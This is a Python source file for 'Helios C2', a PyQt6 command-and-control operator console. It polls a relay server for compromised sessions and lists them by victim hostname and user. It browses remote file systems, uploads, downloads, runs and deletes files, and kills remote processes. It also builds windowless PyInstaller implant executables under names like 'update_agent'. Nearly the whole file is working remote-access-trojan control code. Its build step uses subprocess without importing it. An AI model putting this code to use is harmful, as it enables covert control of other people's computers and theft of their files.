import sys
import time
import requests
import threading
import uuid
import os
import base64
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QPushButton, QLineEdit, QListWidget, QListWidgetItem, QStackedWidget, QLabel,
                             QTextEdit, QStatusBar, QProgressBar, QTabWidget, QTableWidget,
                             QTableWidgetItem, QHeaderView, QMenu, QComboBox, QFileDialog, QMessageBox,
                             QInputDialog, QAbstractItemView)
from PyQt6.QtCore import QThread, pyqtSignal, Qt, QTimer

# --- Configuration ---
# IMPORTANT: Replace with your deployed Relay Server URL
RELAY_URL = "http://127.0.0.1:5555"
POLL_INTERVAL_S = 3

# --- Worker Threads ---
class C2Worker(QThread):
    """Handles background communication with the Relay Server."""
    sessions_updated = pyqtSignal(dict)
    responses_received = pyqtSignal(list)
    status_update = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.running = True
        self.current_session_id = None

    def run(self):
        while self.running:
            self.fetch_sessions()
            if self.current_session_id:
                self.fetch_responses()
            time.sleep(POLL_INTERVAL_S)

    def fetch_sessions(self):
        try:
            response = requests.get(f"{RELAY_URL}/c2/sessions", timeout=5)
            if response.status_code == 200:
                self.sessions_updated.emit(response.json().get("sessions", {}))
            else:
                self.status_update.emit(f"Relay connection error: {response.status_code}")
        except requests.exceptions.RequestException as e:
            self.status_update.emit(f"Relay connection failed: {e}")

    def fetch_responses(self):
        try:
            payload = {"session_id": self.current_session_id}
            response = requests.post(f"{RELAY_URL}/c2/responses", json=payload, timeout=5)
            if response.status_code == 200 and response.json().get("responses"):
                self.responses_received.emit(response.json()["responses"])
        except requests.exceptions.RequestException:
            pass # Fail silently as this is polled frequently

    def stop(self):
        self.running = False
        self.quit()
        self.wait()

class BuildWorker(QThread):
    """Compiles the implant using PyInstaller."""
    log_message = pyqtSignal(str)
    finished = pyqtSignal(bool)

    def __init__(self, implant_name, relay_url):
        super().__init__()
        self.implant_name = implant_name
        self.relay_url = relay_url

    def run(self):
        # This function simulates the build process for a complete example.
        # In a real scenario, it would invoke PyInstaller.
        try:
            self.log_message.emit("[*] Starting implant build...")
            self.log_message.emit(f"[*]   Name: {self.implant_name}.exe")
            self.log_message.emit(f"[*]   Relay: {self.relay_url}")
            
            # 1. Read template
            template_path = os.path.join(os.path.dirname(__file__), "helios_implant.py")
            if not os.path.exists(template_path):
                self.log_message.emit("[!] Error: helios_implant.py template not found.")
                self.finished.emit(False)
                return
            
            with open(template_path, "r") as f:
                code = f.read()

            # 2. Configure
            code = code.replace("{{RELAY_URL}}", self.relay_url)
            
            output_dir = os.path.join(os.path.dirname(__file__), "build")
            os.makedirs(output_dir, exist_ok=True)
            
            configured_path = os.path.join(output_dir, f"{self.implant_name}_configured.py")
            with open(configured_path, "w") as f:
                f.write(code)

            # 3. Build with PyInstaller
            self.log_message.emit("[*] Running PyInstaller (this may take a moment)...")
            
            # Using sys.executable to ensure we use the same python interpreter
            pyinstaller_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--noconfirm", "--onefile", "--noconsole",
                "--distpath", output_dir,
                "--name", self.implant_name,
                "--hidden-import", "requests",
                "--hidden-import", "psutil",
                configured_path
            ]

            process = subprocess.Popen(pyinstaller_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
            
            for line in iter(process.stdout.readline, ''):
                self.log_message.emit(line.strip())
            
            process.wait()

            if process.returncode == 0:
                self.log_message.emit(f"\n[+] Build successful! Implant saved in '{output_dir}' directory.")
                self.finished.emit(True)
            else:
                self.log_message.emit("\n[!] Build failed. Check the log for errors.")
                self.finished.emit(False)

        except Exception as e:
            self.log_message.emit(f"\n[!] An unexpected error occurred: {e}")
            self.finished.emit(False)

class TransferWorker(QThread):
    progress = pyqtSignal(int)
    finished = pyqtSignal(str)
    
    def __init__(self, action, local_path, remote_path, send_command_func):
        super().__init__()
        self.action = action
        self.local_path = local_path
        self.remote_path = remote_path
        self.send_command_func = send_command_func
        self.chunk_size = 1024 * 512 # 512 KB

    def run(self):
        if self.action == "upload":
            self.upload_file()
        elif self.action == "download":
            self.download_file()

    def upload_file(self):
        try:
            file_size = os.path.getsize(self.local_path)
            with open(self.local_path, "rb") as f:
                chunk_num = 0
                while True:
                    chunk = f.read(self.chunk_size)
                    if not chunk: break
                    payload = {
                        "action": "upload_file",
                        "params": {
                            "path": self.remote_path,
                            "chunk": base64.b64encode(chunk).decode(),
                            "is_first": chunk_num == 0
                        }
                    }
                    response = self.send_command_func(payload, wait_for_response=True)
                    if not response or response.get('status') != 'success':
                        self.finished.emit(f"Upload failed: {response.get('data') if response else 'No response'}")
                        return
                    chunk_num += 1
                    progress_percent = min(100, int(((chunk_num * self.chunk_size) / file_size) * 100))
                    self.progress.emit(progress_percent)
            self.finished.emit("Upload complete.")
        except Exception as e:
            self.finished.emit(f"Upload error: {e}")

    def download_file(self):
        try:
            with open(self.local_path, "wb") as f:
                chunk_num = 0
                while True:
                    payload = {"action": "download_file", "params": {"path": self.remote_path, "chunk_num": chunk_num}}
                    response = self.send_command_func(payload, wait_for_response=True)
                    if not response or response.get('status') != 'success':
                        self.finished.emit(f"Download failed: {response.get('data') if response else 'Timeout'}")
                        return
                    
                    chunk = base64.b64decode(response['data']['chunk'])
                    f.write(chunk)
                    
                    # A simple spinner for progress as total size is unknown
                    self.progress.emit((chunk_num * 10) % 100) 
                    
                    if response['data']['is_last']:
                        break
                    chunk_num += 1
            self.progress.emit(100)
            self.finished.emit("Download complete.")
        except Exception as e:
            self.finished.emit(f"Download error: {e}")


# --- Main Application Window ---
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Helios C2")
        self.setGeometry(100, 100, 1100, 800)

        self.sessions = {}
        self.c2_response_handlers = {}
        self.current_path = ""
        self.current_processes = []
        
        self.stack = QStackedWidget()
        self.setCentralWidget(self.stack)

        self.setup_main_ui()
        self.setup_manager_ui()

        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.progress_bar = QProgressBar()
        self.progress_bar.setMaximumWidth(200)
        self.status_bar.addPermanentWidget(self.progress_bar)
        self.progress_bar.hide()

        self.c2_worker = C2Worker()
        self.c2_worker.sessions_updated.connect(self.update_session_list)
        self.c2_worker.responses_received.connect(self.handle_c2_responses)
        self.c2_worker.status_update.connect(self.show_status)
        self.c2_worker.start()

    def closeEvent(self, event):
        self.c2_worker.stop()
        event.accept()

    def show_status(self, message, timeout=3000):
        self.status_bar.showMessage(message, timeout)

    def setup_main_ui(self):
        main_screen = QWidget()
        layout = QVBoxLayout(main_screen)
        
        # Builder Box
        builder_box = QWidget()
        builder_layout = QHBoxLayout(builder_box)
        builder_layout.setContentsMargins(0,0,0,0)
        self.name_input = QLineEdit()
        self.name_input.setPlaceholderText("Enter Implant Name (e.g., update_agent)")
        builder_layout.addWidget(self.name_input)
        self.build_button = QPushButton("Build Implant")
        self.build_button.clicked.connect(self.start_build)
        builder_layout.addWidget(self.build_button)
        
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setFixedHeight(120)
        
        layout.addWidget(QLabel("<h3>Implant Builder</h3>"))
        layout.addWidget(builder_box)
        layout.addWidget(self.log_box)
        layout.addWidget(QLabel("<h3>Live Sessions</h3>"))
        
        self.session_list = QListWidget()
        self.session_list.itemDoubleClicked.connect(self.open_manager_panel)
        layout.addWidget(self.session_list)
        
        self.stack.addWidget(main_screen)

    def setup_manager_ui(self):
        manager_screen = QWidget()
        layout = QVBoxLayout(manager_screen)
        
        top_bar = QHBoxLayout()
        self.manager_title = QLabel("<h3>Managing Session:</h3>")
        back_button = QPushButton("< Back to Sessions")
        back_button.clicked.connect(self.go_to_main_screen)
        top_bar.addWidget(self.manager_title)
        top_bar.addStretch()
        top_bar.addWidget(back_button)
        layout.addLayout(top_bar)

        self.tabs = QTabWidget()
        self.tabs.currentChanged.connect(self.on_tab_changed)
        
        # File Explorer Tab
        fe_tab = QWidget()
        fe_layout = QVBoxLayout(fe_tab)
        nav_bar = QHBoxLayout()
        up_button = QPushButton("⬆️")
        up_button.setFixedWidth(40)
        up_button.clicked.connect(self.navigate_up)
        self.drive_select = QComboBox()
        self.drive_select.currentTextChanged.connect(self.navigate_to_drive)
        self.path_input = QLineEdit()
        self.path_input.returnPressed.connect(self.navigate_to_path)
        upload_button = QPushButton("Upload File")
        upload_button.clicked.connect(self.upload_file_dialog)
        nav_bar.addWidget(up_button)
        nav_bar.addWidget(self.drive_select)
        nav_bar.addWidget(self.path_input, 1)
        nav_bar.addWidget(upload_button)
        fe_layout.addLayout(nav_bar)

        self.file_table = QTableWidget()
        self.file_table.setColumnCount(4)
        self.file_table.setHorizontalHeaderLabels(["Name", "Type", "Size (Bytes)", "Date Modified"])
        self.file_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.file_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Interactive)
        self.file_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.file_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.file_table.doubleClicked.connect(self.file_double_clicked)
        self.file_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.file_table.customContextMenuRequested.connect(self.show_file_context_menu)
        fe_layout.addWidget(self.file_table)

        # Process Manager Tab
        pm_tab = QWidget()
        pm_layout = QVBoxLayout(pm_tab)
        refresh_btn = QPushButton("Refresh Processes")
        refresh_btn.clicked.connect(self.refresh_processes)
        pm_layout.addWidget(refresh_btn)

        self.process_table = QTableWidget()
        self.process_table.setColumnCount(4)
        self.process_table.setHorizontalHeaderLabels(["PID", "Name", "Username", "Memory (MB)"])
        self.process_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.process_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.process_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.process_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.process_table.customContextMenuRequested.connect(self.show_process_context_menu)
        pm_layout.addWidget(self.process_table)

        self.tabs.addTab(fe_tab, "File Explorer")
        self.tabs.addTab(pm_tab, "Process Manager")
        layout.addWidget(self.tabs)
        self.stack.addWidget(manager_screen)

    def start_build(self):
        name = self.name_input.text()
        if not name:
            QMessageBox.warning(self, "Build Error", "Please enter a name for the implant.")
            return
        self.build_button.setEnabled(False)
        self.build_button.setText("Building...")
        self.log_box.clear()

        self.build_worker = BuildWorker(name, RELAY_URL)
        self.build_worker.log_message.connect(self.log_box.append)
        self.build_worker.finished.connect(self.on_build_finished)
        self.build_worker.start()

    def on_build_finished(self, success):
        self.build_button.setEnabled(True)
        self.build_button.setText("Build Implant")
        if success:
            QMessageBox.information(self, "Build Success", f"Implant '{self.name_input.text()}.exe' built successfully.")
        else:
            QMessageBox.critical(self, "Build Failed", "The implant build failed. Check the log for details.")

    def update_session_list(self, live_sessions):
        current_selection = self.session_list.currentItem().data(Qt.ItemDataRole.UserRole) if self.session_list.currentItem() else None
        
        self.session_list.clear()
        self.sessions = live_sessions
        
        for sid, data in sorted(self.sessions.items()):
            item = QListWidgetItem(f"{data.get('hostname', 'N/A')}@{data.get('user', 'N/A')} (ID: ...{sid[-12:]})")
            item.setData(Qt.ItemDataRole.UserRole, sid)
            self.session_list.addItem(item)
            if sid == current_selection:
                self.session_list.setCurrentItem(item)

    def go_to_main_screen(self):
        self.c2_worker.current_session_id = None
        self.stack.setCurrentIndex(0)
    
    def open_manager_panel(self, item):
        session_id = item.data(Qt.ItemDataRole.UserRole)
        self.c2_worker.current_session_id = session_id
        self.manager_title.setText(f"<h3>Managing: {self.sessions[session_id].get('hostname')}</h3>")
        self.stack.setCurrentIndex(1)
        self.tabs.setCurrentIndex(0) # Default to file explorer
        self.send_command({"action": "list_drives"})
        self.refresh_files("C:\\")

    def on_tab_changed(self, index):
        if self.stack.currentIndex() != 1: return
        tab_text = self.tabs.tabText(index)
        if tab_text == "File Explorer":
            if not self.current_path: self.refresh_files("C:\\")
        elif tab_text == "Process Manager":
            self.refresh_processes()
    
    # --- Command and Response Handling ---
    def send_command(self, payload, wait_for_response=False):
        if not self.c2_worker.current_session_id: return None
        
        response_id = str(uuid.uuid4())
        payload['response_id'] = response_id
        
        full_command = {
            "session_id": self.c2_worker.current_session_id,
            "command": payload
        }
        
        response_data = None
        if wait_for_response:
            response_event = threading.Event()
            def handler(response):
                nonlocal response_data
                response_data = response.get('result')
                response_event.set()
            self.c2_response_handlers[response_id] = handler

        try:
            requests.post(f"{RELAY_URL}/c2/task", json=full_command, timeout=10)
        except requests.exceptions.RequestException as e:
            self.show_status(f"Error sending command: {e}")
            if wait_for_response:
                self.c2_response_handlers.pop(response_id, None)
            return None

        if wait_for_response:
            # Wait for response with a timeout
            if not response_event.wait(timeout=30): # 30 second timeout for response
                self.c2_response_handlers.pop(response_id, None)
                self.show_status("Command timed out.", 5000)
                return None
            return response_data
        
        return None

    def handle_c2_responses(self, responses):
        for res in responses:
            response_id = res.get('response_id')
            if response_id in self.c2_response_handlers:
                # Let the specific waiting handler process it
                self.c2_response_handlers.pop(response_id)(res)
            else:
                # Handle generic, non-awaited responses
                self.process_generic_response(res)

    def process_generic_response(self, response):
        result = response.get('result', {})
        if result.get('status') != 'success':
            self.show_status(f"Implant Error: {result.get('data', 'Unknown error')}", 5000)
            return

        data = result.get('data')
        if not data: return # Simple success confirmation

        action = response.get('original_action')
        if action == 'list_drives':
            self.drive_select.blockSignals(True)
            self.drive_select.clear()
            self.drive_select.addItems(data)
            self.drive_select.blockSignals(False)
        elif action == 'list_directory':
            self.populate_file_table(data)
        elif action == 'list_processes':
            self.populate_process_table(data)
        elif isinstance(data, str):
            self.show_status(data, 4000)
    
    # --- File Explorer Logic ---
    def populate_file_table(self, data):
        self.current_path = data['path']
        self.path_input.setText(self.current_path)
        self.file_table.setRowCount(0)
        items = sorted(data['items'], key=lambda x: (x['type'] != 'folder', x['name'].lower()))
        self.file_table.setRowCount(len(items))
        for row, item in enumerate(items):
            self.file_table.setItem(row, 0, QTableWidgetItem(item['name']))
            self.file_table.setItem(row, 1, QTableWidgetItem(item['type']))
            self.file_table.setItem(row, 2, QTableWidgetItem(str(item['size'])))
            self.file_table.setItem(row, 3, QTableWidgetItem(item['modified']))
    
    def refresh_files(self, path=None):
        target_path = path if path is not None else self.current_path
        self.send_command({"action": "list_directory", "params": {"path": target_path}})

    def navigate_up(self):
        if self.current_path:
            parent = os.path.dirname(self.current_path.replace('\\', '/'))
            # Handle root case (e.g., parent of C:\ is C:\)
            if parent != self.current_path:
                self.refresh_files(parent)

    def navigate_to_path(self): self.refresh_files(self.path_input.text())
    def navigate_to_drive(self, drive):
        if drive: self.refresh_files(drive)

    def file_double_clicked(self, index):
        item_type = self.file_table.item(index.row(), 1).text()
        if item_type == 'folder':
            folder_name = self.file_table.item(index.row(), 0).text()
            # Use os.path.join for robust path construction
            new_path = os.path.join(self.current_path, folder_name).replace('\\', '/')
            self.refresh_files(new_path)

    def show_file_context_menu(self, position):
        menu = QMenu()
        # Actions for when an item is selected
        selected_items = self.file_table.selectionModel().selectedRows()
        if selected_items:
            item_name = self.file_table.item(selected_items[0].row(), 0).text()
            item_type = self.file_table.item(selected_items[0].row(), 1).text()

            if item_type == 'file':
                menu.addAction("Execute")
                menu.addAction("Download")
            menu.addAction("Rename")
            menu.addAction("Delete")
            menu.addSeparator()

        menu.addAction("New Folder")
        action = menu.exec(self.file_table.mapToGlobal(position))
        if not action: return
        
        # Handle actions
        full_path = ""
        if selected_items:
            full_path = os.path.join(self.current_path, item_name).replace('\\', '/')
        
        if action.text() == "Execute":
            self.send_command({"action": "execute_file", "params": {"path": full_path}})
        elif action.text() == "Download":
            self.download_file_dialog(full_path)
        elif action.text() == "Delete":
            if QMessageBox.question(self, "Confirm Delete", f"Are you sure you want to delete '{item_name}'?") == QMessageBox.StandardButton.Yes:
                self.send_command({"action": "delete_path", "params": {"path": full_path}})
                QTimer.singleShot(1000, self.refresh_files) # Refresh after a short delay
        elif action.text() == "Rename":
            new_name, ok = QInputDialog.getText(self, "Rename", "Enter new name:", text=item_name)
            if ok and new_name and new_name != item_name:
                self.send_command({"action": "rename_path", "params": {"old_path": full_path, "new_path": os.path.join(self.current_path, new_name).replace('\\', '/')}})
                QTimer.singleShot(1000, self.refresh_files)
        elif action.text() == "New Folder":
            name, ok = QInputDialog.getText(self, "New Folder", "Enter folder name:")
            if ok and name:
                self.send_command({"action": "new_folder", "params": {"path": os.path.join(self.current_path, name).replace('\\', '/')}})
                QTimer.singleShot(1000, self.refresh_files)

    def upload_file_dialog(self):
        local_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if not local_path: return
        remote_path = os.path.join(self.current_path, os.path.basename(local_path)).replace('\\', '/')
        self.start_transfer("upload", local_path, remote_path)
        
    def download_file_dialog(self, remote_path):
        local_path, _ = QFileDialog.getSaveFileName(self, "Save File As", os.path.basename(remote_path))
        if not local_path: return
        self.start_transfer("download", local_path, remote_path)
        
    def start_transfer(self, action, local_path, remote_path):
        self.progress_bar.setValue(0)
        self.progress_bar.show()
        self.show_status(f"Starting {action}...")

        # The send_command function needs to be passed to the worker
        send_func = lambda payload, wait_for_response=True: self.send_command(payload, wait_for_response)
        
        self.transfer_worker = TransferWorker(action, local_path, remote_path, send_func)
        self.transfer_worker.progress.connect(self.progress_bar.setValue)
        self.transfer_worker.finished.connect(self.on_transfer_finished)
        self.transfer_worker.start()

    def on_transfer_finished(self, message):
        self.show_status(message, 5000)
        self.progress_bar.hide()
        if "complete" in message.lower():
            self.refresh_files() # Refresh file list on success

    # --- Process Manager Logic ---
    def populate_process_table(self, processes):
        self.current_processes = processes
        self.process_table.setRowCount(0)
        self.process_table.setRowCount(len(self.current_processes))
        for row, proc in enumerate(self.current_processes):
            self.process_table.setItem(row, 0, QTableWidgetItem(str(proc['pid'])))
            self.process_table.setItem(row, 1, QTableWidgetItem(proc['name']))
            self.process_table.setItem(row, 2, QTableWidgetItem(str(proc.get('username', 'N/A'))))
            self.process_table.setItem(row, 3, QTableWidgetItem(f"{proc.get('memory_mb', 0):.2f}"))
            
    def refresh_processes(self): self.send_command({"action": "list_processes"})

    def show_process_context_menu(self, position):
        selected_items = self.process_table.selectionModel().selectedRows()
        if not selected_items: return
        
        pid = int(self.process_table.item(selected_items[0].row(), 0).text())
        
        menu = QMenu()
        kill_action = menu.addAction("Kill Process")
        action = menu.exec(self.process_table.mapToGlobal(position))
        
        if action == kill_action:
            self.send_command({"action": "kill_process", "params": {"pid": pid}})
            QTimer.singleShot(1000, self.refresh_processes)

# --- Application Entry Point ---
if __name__ == '__main__':
    app = QApplication(sys.argv)
    # Apply a basic style for a more modern look
    app.setStyle('Fusion')
    window = MainWindow()
    window.show()
    sys.exit(app.exec())